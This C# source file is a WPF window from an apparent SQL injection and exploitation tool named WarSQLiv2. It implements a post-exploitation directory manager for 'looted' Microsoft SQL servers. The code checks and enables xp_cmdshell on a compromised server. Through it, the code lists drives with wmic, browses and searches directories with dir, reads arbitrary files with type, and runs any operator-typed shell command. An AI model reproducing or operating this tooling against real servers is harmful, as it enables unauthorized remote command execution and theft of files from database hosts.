using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using System.Windows.Threading;
using WarSQLiv2.Exploitation.Control;
using WarSQLiv2.Exploitation.PostExploitation;

namespace WarSQLiv2.UserControls.Attack.MSSQL
{
    /// <summary>
    /// Interaction logic for FrmDirectoryManager.xaml
    /// </summary>
    public partial class FrmDirectoryManager : Window
    {
        private readonly LanguageControl _languageControl = new LanguageControl();
        public xpCmdShellControl cmdControl = new xpCmdShellControl();
        readonly MsSqlPostExploitation _postExploitation = new MsSqlPostExploitation();
        private int _selectedId = 0;
        public FrmDirectoryManager()
        {
            InitializeComponent();
        }
        private void Window_Loaded(object sender, RoutedEventArgs e)
        {
            _languageControl.FindLang();
            var lootedFileControl = new LootedFileControl();
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    btnSearch.Content = _languageControl.SelectedLanguage.GetString("ButtonSearch");
                    btnShowFile.Content = _languageControl.SelectedLanguage.GetString("ButtonShow");
                    btnCommand.Content = _languageControl.SelectedLanguage.GetString("ButtonRunCommand");
                    lblAdvCommand.Content = _languageControl.SelectedLanguage.GetString("GroupBoxAdvanced");
                    lblLooted.Content = _languageControl.SelectedLanguage.GetString("GroupBoxLooted");
                    lblLocalDirectory.Content = _languageControl.SelectedLanguage.GetString("GroupBoxDirectory");
                    lblVolumeList.Content = _languageControl.SelectedLanguage.GetString("GroupBoxVolume");
                    Title = _languageControl.SelectedLanguage.GetString("TitleDirectoryManager");
                    lootedFileControl.FileControl();
                    var lootedList = lootedFileControl.LootedList;
                    foreach (var t in lootedList)
                    {
                        lstLooted.Items.Add(t);
                    }

                    lstLooted.SelectedIndex = 0;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = string.Empty;
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });
                var isActivated = cmdControl.isActivated;
                var isExecuted = cmdControl.isExecuted;
                if (isActivated == false && isExecuted == false)
                {
                    var enableXpCmdShell = new EnableXpCmdShell { LootedServer = lstLooted.SelectedItem.ToString() };
                    try
                    {
                        Dispatcher.Invoke((Action)delegate
                        {
                            enableXpCmdShell.XpCmdShellStatus();
                            txtStatus.AppendText(enableXpCmdShell.Result);
                            var cmdLandResult = _languageControl.SelectedLanguage.GetString("XPCmdShell2");
                            var contains = enableXpCmdShell.Result.Contains(cmdLandResult);
                            if (contains == true)
                            {
                                isActivated = true;
                                isExecuted = true;
                            }
                        });
                    }
                    catch (Exception)
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.AppendText(enableXpCmdShell.CmdException);
                        });
                    }
                }
                if (isExecuted == true && isActivated == true)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        try
                        {
                            _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                            _postExploitation.SqlCommand = "wmic logicaldisk get caption";
                            _postExploitation.SqlExploitation();
                            lstDirectory.Items.Clear();
                            for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                            {
                                lstDirectory.Items.Add(_postExploitation.VolumeList[i]);
                                lstDirectory.Items.Remove("");
                            }
                        }
                        catch (Exception exp)
                        {
                            txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                        }
                    });
                }
            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(lootedFileControl.Exception);
                });
            }
        }
        private void lstLooted_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            try
            {
                Dispatcher.Invoke((Action)delegate
                {
                    _selectedId = 0;
                    _selectedId = lstLooted.SelectedIndex;
                    lblStrip.Content = string.Empty;
                    var toolStripControl = new ToolStripInformation
                    {
                        SelectedLootedServer = lstLooted.SelectedItem.ToString(),
                        Command = "sp_server_info",
                    };
                    toolStripControl.SqlServerInformation();
                    lblStrip.Content = toolStripControl.SqlServerInfo;
                });

            }
            catch (Exception exp)
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                });

            }
        }
        private void lstDirectory_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (lstDirectory.SelectedIndex > -1)
            {
                try
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.SqlCommand = "dir " + lstDirectory.SelectedItem.ToString().Trim().Replace("       ", "").Replace("\n", "").Replace(":", ":\\");
                        _postExploitation.VolumeList.Clear();
                        _postExploitation.SqlExploitation();
                        txtStatus.AppendText(_postExploitation.ExploitResult);
                        lstFile.Items.Clear();
                        for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                        {
                            lstFile.Items.Add(_postExploitation.VolumeList[i]);
                            lstFile.Items.Remove("");
                        }
                    });                    
                }
                catch (Exception exp)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    });                    
                }
            }
            else
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("ExploitError2")}");
                }); 
            }
        }
        private void lstFile_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (lstFile.SelectedIndex > -1 && lstFile.SelectedIndex > 3)
            {
                try
                {
                    _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                    if (lstFile.SelectedItem.ToString().Contains("    <DIR>   "))
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            var command = "dir " + lstFile.SelectedItem;
                            var command2 = command.Split('>');
                            var command3 = "dir \"" + lstFile.Items[2].ToString().Trim().Replace("       ", "").Replace("\n", "").Replace("Directory of ", "") + "\\" + command2[1].Trim();
                            var command4 = command3.Split('\\');
                            var sendCommand1 = "";
                            sendCommand1 += command4[0] + "\\";
                            var sendCommand2 = "";
                            for (var i = 1; i < command4.Count(); i++)
                            {
                                sendCommand1 += command4[i] + "\\";
                            }

                            if (sendCommand1.Contains(":\\\\"))
                            {
                                sendCommand2 = sendCommand1.Replace(":\\\\", ":\\");
                            }
                            else
                            {
                                sendCommand2 = sendCommand1.Replace(":\\\\", ":\\");
                            }
                            _postExploitation.SqlCommand = sendCommand2 + "\"";
                        });
                    }
                    else
                    {
                        Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                        {
                            txtStatus.Document.Blocks.Clear();
                            var control = lstFile.Items[2].ToString().Trim().Replace("       ", "").Replace("\n", "").Replace("Directory of ", "");
                            if (control.Length > 3)
                            {
                                var command = lstFile.SelectedItem.ToString();
                                var command2 = command.Split(':');
                                var command3 = lstFile.Items[2].ToString().Trim().Replace("       ", "").Replace("\n", "").Replace("Directory of ", "") + "\\" + command2[1].Trim();
                                var command4 = command3.Trim().Replace("             ", "").Replace("\\\\", "\\").Replace("           ", "").Replace("          ", "").Replace("         ", "").Replace("        ", "").Replace("       ", "").Replace("      ", "").Replace("     ", "").Replace("    ", "").Replace("  ", "");
                                var sendCommand = "";
                                if (command4.Contains("AM") || command4.Contains("PM"))
                                {
                                    var command5 = command4.Replace("AM", "").Replace("PM", "").Split(' ');
                                    if (command5.Count() == 4)
                                    {
                                        sendCommand += command5[0].Substring(0, command5[0].Length - 2) + command5[command5.Count() - 1];
                                    }
                                    else if (command5.Count() == 5)
                                    {
                                        sendCommand += command5[0] + " " + command5[1] + " " + command5[2].Substring(0, command5[2].Length - 2) + command5[command5.Count() - 1];
                                    }
                                    else if (command5.Count() == 6)
                                    {
                                        sendCommand += command5[0] + " " + command5[1] + " " + command5[2] + " " + command5[3].Substring(0, command5[3].Length - 2) + command5[command5.Count() - 1];
                                    }
                                    else
                                    {
                                        sendCommand += command5[0].Substring(0, command5[0].Length - 2) + command5[command5.Count() - 1];
                                    }

                                }
                                else
                                {
                                    var command5 = command4.Split(' ');
                                    var command6 = command5[0].Split('\\');
                                    for (var i = 0; i < command6.Count() - 1; i++)
                                    {
                                        sendCommand += command6[i] + "\\";
                                    }
                                    sendCommand += command5[command5.Count() - 1];
                                }

                                _postExploitation.SqlCommand = "type \"" + sendCommand + "\"";
                            }
                            else
                            {
                                var command = lstFile.SelectedItem.ToString();
                                var command2 = command.Split(':');
                                var command3 = lstFile.Items[2].ToString().Trim().Replace("       ", "").Replace("\n", "").Replace("Directory of ", "") + "\\" + command2[1].Trim();
                                var command4 = command3.ToString().Replace("             ", "").Replace("\\\\", "\\");
                                var command5 = command4.Substring(0, 3);
                                var command6 = command4.Split(' ');
                                var sendCommand = command5;
                                for (var i = 1; i < command6.Count(); i++)
                                {
                                    sendCommand += command6[i] + " ";
                                }
                                _postExploitation.SqlCommand = "type \"" + sendCommand + "\"";
                            }
                        });                        
                    }
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        _postExploitation.VolumeList.Clear();
                        _postExploitation.SqlExploitation();
                        txtStatus.AppendText(_postExploitation.ExploitResult);
                        lstFile.Items.Clear();
                        for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                        {
                            if (_postExploitation.VolumeList.Count > 4)
                            {
                                lstFile.Items.Add(_postExploitation.VolumeList[i]);
                                lstFile.Items.Remove("");
                            }
                        }
                    });
                }
                catch (Exception exp)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    });
                }
            }
            else
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("ExploitError3")}");
                });
            }
        }
        private void btnSearch_Click(object sender, RoutedEventArgs e)
        {
            if (!string.IsNullOrEmpty(txtSearch.Text))
            {
                try
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.SqlCommand = "dir /S /P " + txtSearch.Text;
                        _postExploitation.VolumeList.Clear();
                        _postExploitation.SqlExploitation();
                        txtStatus.AppendText(_postExploitation.ExploitResult);
                        lstFile.Items.Clear();
                        for (var i = 0; i < _postExploitation.VolumeList.Count; i++)
                        {
                            lstFile.Items.Add(_postExploitation.VolumeList[i]);
                            lstFile.Items.Remove("");
                        }
                    });
                }
                catch (Exception exp)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    });
                }
            }
            else
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("ExploitError3")}");
                });
            }
        }
        private void btnShowFile_Click(object sender, RoutedEventArgs e)
        {
            if (!string.IsNullOrEmpty(txtFileRead.Text))
            {
                try
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.SqlCommand = "type \"" + txtFileRead.Text + "\"";
                        _postExploitation.VolumeList.Clear();
                        _postExploitation.SqlExploitation();
                        txtStatus.AppendText(_postExploitation.ExploitResult);
                    });
                }
                catch (Exception exp)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    });
                }
            }
            else
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("ExploitError2")}");
                });
            }
        }
        private void btnCommand_Click(object sender, RoutedEventArgs e)
        {
            if (!string.IsNullOrEmpty(txtCommand.Text))
            {
                try
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        _postExploitation.SelectedItem = lstLooted.SelectedItem.ToString();
                        _postExploitation.SqlCommand = txtCommand.Text;
                        _postExploitation.VolumeList.Clear();
                        _postExploitation.SqlExploitation();
                        txtStatus.AppendText(_postExploitation.ExploitResult);
                    });
                }
                catch (Exception exp)
                {
                    Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                    {
                        txtStatus.AppendText(string.Format("{2}{3}{0}{1}", Environment.NewLine, exp.Message, _languageControl.SelectedLanguage.GetString("GeneralError1"), _languageControl.SelectedLanguage.GetString("GeneralError2")));
                    });
                }
            }
            else
            {
                Dispatcher.BeginInvoke(DispatcherPriority.Send, (Action)delegate
                {
                    txtStatus.AppendText($"{Environment.NewLine}{_languageControl.SelectedLanguage.GetString("ExploitError2")}");
                });
            }
        }
    }
}
